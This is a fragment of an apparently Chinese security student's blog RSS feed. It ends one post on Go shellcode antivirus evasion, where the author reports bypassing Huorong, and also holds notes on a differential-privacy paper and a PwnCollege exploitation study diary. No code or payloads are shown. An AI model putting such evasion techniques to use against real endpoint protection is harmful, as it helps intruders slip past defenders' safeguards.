			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;查看能否上线&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 162; 
			flex-basis: 390px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224.png&#34; data-size=&#34;1299x799&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224.png&#34;
			width=&#34;1299&#34;
			height=&#34;799&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224_hu6386907720073067038.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224_hu15496909413846274933.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-总结&#34;&gt;5. 总结
&lt;/h1&gt;&lt;p&gt;这是第一次尝试免杀，之前一直在学习pwn和web安全，但是在前段时间的上海市大学生磐石行动的比赛中，发现内网中存在杀毒软件，且无法及时绕过，虽然通过文件包含读取到了flag，但是却阻止了我们进一步的渗透利用，最后也只获得了第十一名，与决赛遗憾错过。&lt;/p&gt;
&lt;p&gt;回来之后，反思了很多，觉得还是要对免杀进行一部分的学习，go语言的shellcode免杀通过微信推文看到的，决定挺有意思的，便在之后的学习中进行尝试，没想到就成功绕过了火绒（其他杀毒软件还没有尝试过），但是这也激起了我学习的热情。&lt;/p&gt;
&lt;p&gt;此外，最近也收到了实验室导师的任务，给本科生同学们准备渗透测试（CTF）的课程，也觉得免杀蛮重要的，顺便也一起给讲了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;学无止境，脚踏实地。&lt;/strong&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Vehicle-to-Vehicle Energy Sharing Scheme: A Privacy-Preserving Solution based on Local Differential Privacy Method</title>
        <link>https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/</link>
        <pubDate>Fri, 17 May 2024 14:27:25 +0800</pubDate>
        
        <guid>https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/</guid>
        <description>&lt;img src="https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517144025453.png" alt="Featured image of post Vehicle-to-Vehicle Energy Sharing Scheme: A Privacy-Preserving Solution based on Local Differential Privacy Method" /&gt;&lt;h1 id=&#34;v2v电车能量交换&#34;&gt;V2V电车能量交换
&lt;/h1&gt;&lt;p&gt;Vehicle-to-Vehicle Energy Sharing Scheme: A Privacy-Preserving Solution based on Local Differential Privacy Method&lt;/p&gt;
&lt;p&gt;贡献点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;自适应隐私预算分配( Adaptive Privacy Budget Allocation，APA )模型，通过隐私预算分配来平衡数据失真和隐私泄露风险。&lt;/li&gt;
&lt;li&gt;平衡数据隐私保护水平和数据效用的高效用扰动( HUP )模型。&lt;/li&gt;
&lt;li&gt;改进轨迹隐私保护的隐私加权平均( PWA )模型。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 101; 
			flex-basis: 242px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143556752.png&#34; data-size=&#34;671x663&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143556752.png&#34;
			width=&#34;671&#34;
			height=&#34;663&#34;
			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143556752_hu13377655088549744554.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143556752_hu15176021189869584182.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Implementation of VES scheme&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Implementation of VES scheme&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;apa模型-自适应隐私计算分配模型-用来平衡噪声和信息可用性&#34;&gt;APA模型 自适应隐私计算分配模型 &lt;strong&gt;用来平衡噪声和信息可用性&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;原始位置经历LDP（本地差分隐私）扰动【添加噪声】。使用高斯核函数和哈曼顿距离来衡量两个位置之间的相似性（S，公式1）&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 158; 
			flex-basis: 381px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143658121.png&#34; data-size=&#34;659x415&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143658121.png&#34;
			width=&#34;659&#34;
			height=&#34;415&#34;
			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143658121_hu1422207598453298841.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143658121_hu10144600491940394866.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;APA Model&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;APA Model&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;公式1：使用高斯核函数和曼哈顿距离来衡量位置的相似性，参数σ表示缩放参数，决定了相似性随着距离递减而放大的速率。S的取值范围是[0,1]。&lt;/p&gt;
&lt;p&gt;公式2：轨迹信息泄露量(TIL) = 求和[1/(相似性×距离)]？&lt;/p&gt;
&lt;p&gt;公式3：&lt;strong&gt;ε&lt;/strong&gt;remain表示剩余的隐私预算，εtotal表示总体隐私预算，εk表示指定位置隐私预算支出。&lt;/p&gt;
&lt;p&gt;公式4：εmin 和 εmax分别**：**引入ε min来避免将微薄的预算分配到后续位置，ε max是最大隐私预算上限的阈值。&lt;/p&gt;
&lt;h2 id=&#34;hup模型-平衡数据隐私保护水平和数据效用的高效用扰动&#34;&gt;HUP模型 平衡数据隐私保护水平和数据效用的高效用扰动
&lt;/h2&gt;&lt;p&gt;使用HUP模型的主要目的是在使用LDP方法保护数据隐私的同时，尽可能地保留原始数据的有用信息。例如，当我们需要共享敏感数据时，我们可以使用位置扰动算法对一些数据点的位置进行扰动，而不是完全按照LDP方法修改数据点的值。（不是很能理解）&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 138; 
			flex-basis: 331px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143736357.png&#34; data-size=&#34;340x246&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143736357.png&#34;
			width=&#34;340&#34;
			height=&#34;246&#34;
			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143736357_hu18299786016816125202.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143736357_hu2112904138365969308.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;HUP model&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;HUP model&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;因此，为了最小化参与者的轨迹隐私泄露风险和最大化统计效用，我们提出了基于阈值的位置扰动( TPP )算法来获得扰动位置。&lt;/p&gt;
&lt;p&gt;TPP算法在保证数据效用的同时，优化了&lt;strong&gt;Hausdorff距离&lt;/strong&gt;不变性的数据处理流程。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 95; 
			flex-basis: 229px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143805378.png&#34; data-size=&#34;669x699&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143805378.png&#34;
			width=&#34;669&#34;
			height=&#34;699&#34;
			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143805378_hu5228982941530961936.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143805378_hu8803011660550759096.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Algorithm 1&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Algorithm 1&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;pwa-改进轨迹隐私保护的隐私加权平均-防止扰动位置太假了容易被辨别出来&#34;&gt;PWA 改进轨迹隐私保护的隐私加权平均 （防止扰动位置太假了，容易被辨别出来）
&lt;/h2&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 133; 
			flex-basis: 319px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143844201.png&#34; data-size=&#34;321x241&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143844201.png&#34;
			width=&#34;321&#34;
			height=&#34;241&#34;
			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143844201_hu1574775299246013532.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143844201_hu8527504982689013116.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;PWA Model&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;PWA Model&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;问题&#34;&gt;问题：
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;该文章使用了差分隐私的扰乱机制的具体技术？文章中并没有提到说使用什么扰动机制。只提到了LDP，local 差分隐私。&lt;/li&gt;
&lt;li&gt;该方案中APA模型中的第三步，第四步的具体含义？
&lt;ol&gt;
&lt;li&gt;答：APA隐私预算自适应分配模型，隐私预算较大时，噪声较高，保护水平高，但是信息可用性会收到影响；当隐私预算较小时，噪声较低，保护水平低，但是信息的可用性较高。 对于剩余隐私预算&lt;/li&gt;
&lt;li&gt;答：对于公式3来说，As evident from Fig. 3, formulas 3 and 4, the initial step involves the computation of the remaining privacy budget, denoted as εremain, for positions within the window [iω + 1, i].文章中说到这个公式求和的时候，位置[iw+1,i]区间剩余的隐私度量。&lt;/li&gt;
&lt;li&gt;懂了，使用TIL&lt;em&gt;remain，表示之前的隐私泄露量&lt;/em&gt;隐私预算，达到考虑之前所以的差分隐私位置的影响。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 244; 
			flex-basis: 586px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143953811.png&#34; data-size=&#34;814x333&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143953811.png&#34;
			width=&#34;814&#34;
			height=&#34;333&#34;
			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143953811_hu15781801442244549392.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143953811_hu9693468744045459166.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;公式&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;公式&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PwnCollege 学习笔记</title>
        <link>https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
        <pubDate>Fri, 17 May 2024 13:26:06 +0800</pubDate>
        
        <guid>https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
        <description>&lt;img src="https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517133556992.png" alt="Featured image of post PwnCollege 学习笔记" /&gt;&lt;h1 id=&#34;1-学习路线&#34;&gt;1. 学习路线
&lt;/h1&gt;&lt;p&gt;作为一名网络安全的学生，最开始接触到的就是web安全。但是在学习web安全的过程中，逐渐发现web安全需要更多更广的知识面。但是这对于现在的我来说是不现实的，因为在读研过程中，花费更时间去阅读论文和完成导师的项目。&lt;/p&gt;
&lt;p&gt;此外，总是听见别人说，pwn爷，pwn爷的，也觉得学习pwn，二进制安全是很厉害的。不过也正式因为如此，pwn的学习需要很多基本知识（汇编，C/C++，linux安全机制，堆栈相关知识等）。总之就是需要很多知识作为铺垫才能帮助去深入理解pwn的原理和技术。&lt;/p&gt;
&lt;h1 id=&#34;2-pwncollege&#34;&gt;2. PwnCollege
&lt;/h1&gt;&lt;p&gt;众所周知，学习安全技术，特别是这种国内敏感技术，很多国内的网站是无法找到资源的。机缘巧合之前，我认识了一个大佬同学（腾讯安全、UCI博士在读），在他的建议下，我开始尝试pwnCollege的学习。作为一个英语高考只有100分的我来说，在学习过程中确实遇到了很多很多的困难。&lt;/p&gt;
&lt;p&gt;但是兴趣是最好的老师，这个课程的学习相比课堂上的读PPT会更加有趣且令人心动。在这种兴趣的不断吸引下，我从23年8月份开始学习pwnCollege的CES-466课程，截至目前位置已经完成一半内容 的学习。当然距离蓝带的路还是很远很远。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 218; 
			flex-basis: 524px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135251761.png&#34; data-size=&#34;686x314&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135251761.png&#34;
			width=&#34;686&#34;
			height=&#34;314&#34;
			srcset=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135251761_hu13477238092531730755.png 480w, https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135251761_hu2648177404691251340.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 138; 
			flex-basis: 333px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135330228.png&#34; data-size=&#34;1426x1026&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135330228.png&#34;
			width=&#34;1426&#34;
			height=&#34;1026&#34;
			srcset=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135330228_hu633313453631095762.png 480w, https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135330228_hu9109907385128331726.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;从最简单的程序交互-&amp;gt;汇编基础-&amp;gt;shellcode注入-&amp;gt;debug-&amp;gt;逆向工程。。。&lt;/p&gt;
&lt;p&gt;在这些学习过程中，我收获很多，开始逐渐向着计算机底层靠近。&lt;/p&gt;
&lt;h1 id=&#34;3-感受&#34;&gt;3. 感受
&lt;/h1&gt;&lt;p&gt;通过冯诺依曼结构的代码段和text段没有明显区别可以在堆栈上写入shellcode，去执行恶意代码；&lt;/p&gt;
&lt;p&gt;设置ROP完成系统调用；格式化字符串泄露程序carry，爆破PIE，libc地址泄露，任意内存读写去修改汇编指令完成程序执行流（CFI）的控制，这些都是我在学习中获得的知识。每一次过题，都是一种前所未有的幸福，不仅仅是自己的知识增长了，更重要的是，解开了所谓”抽象“的面纱。&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
